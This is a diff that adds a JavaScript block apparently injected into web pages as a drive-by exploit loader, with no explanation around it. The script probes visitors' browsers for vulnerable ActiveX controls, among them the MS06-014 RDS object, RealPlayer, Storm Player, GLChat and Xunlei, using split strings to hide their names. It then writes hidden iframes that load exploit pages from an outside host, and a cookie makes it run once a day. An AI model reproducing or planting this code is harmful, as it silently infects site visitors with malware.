@@ -1,0 +1,65 @@
+<script>
+function hao(){
+	document.writeln()
+		}window.onload=hao;
+	if(document.cookie.indexOf('CuteqqCookies')==-1){
+	var cuteqqid0="id:";
+        var cuteqqid1="cls"
+        var cuteqqid=cuteqqid0+cuteqqid1
+	var cuteqqids="BD96C556-65A3-11D0-983A-00C04FC29E36";
+	var cuteqqidx=cuteqqid+cuteqqids;
+	try{var e;
+	var ado=(document.createElement("object"));
+	ado.setAttribute("classid", cuteqqidx);
+	var as=ado.createobject("Adodb.Stream","");
+	}catch(e){
+
+	};
+	finally{
+	var expires=new Date();
+	expires.setTime(expires.getTime()+24*60*60*1000);
+	document.cookie='CuteqqCookies=CuteqqSave;path=/;expires='+expires.toGMTString();
+	if(e!="[object Error]"){
+	document.write("<iframe width='0' height='0' src='http://www.ckabc.net/Ajax.htm'></iframe>")
+	document.write("<iframe width='0' height='0' src='http://www.ckabc.net/Ms06014.htm'></iframe>")
+	}else{
+	try{
+	var r;
+	var real=new ActiveXObject("IERPCtl.IERPCtl.1");
+	}
+	catch(r){
+
+	};
+	finally{
+	if(r!="[object Error]"){document.write("<script srcc><\/script>")}
+	}
+	try{
+	var s;
+	var storm=new window["ActiveXObject"]("MP"+"S.S"+"tor"+"mPl"+"ayer");
+	}
+	catch(s){
+
+	};
+	finally{
+	if(s!="[object Error]"){document.write("<iframe width='5' height='5' src='http://www.ckabc.net/Bfyy.htm'></iframe>")}
+	}try{
+	var l;
+	var Lz=new window["ActiveXObject"]("GLC"+"HAT.G"+"LCh"+"atC"+"trl.1");
+	}catch(l){
+
+	};
+	finally{
+	if(l!="[object Error]"){document.write("<iframe width='5' height='5' src='http://www.ckabc.net/Lz.htm'></iframe>")}
+	}try{
+	var x;
+	var xl=new ActiveXObject("DPC"+"lie"+"nt.V"+"od");
+	}catch(x){
+
+	};
+	finally{
+	if(x!="[object Error]"){document.write("<iframe width='15' height='15' src='http://www.ckabc.net/XunLei.htm'></iframe>")}
+	}
+					}
+			}
+	}
+</script>
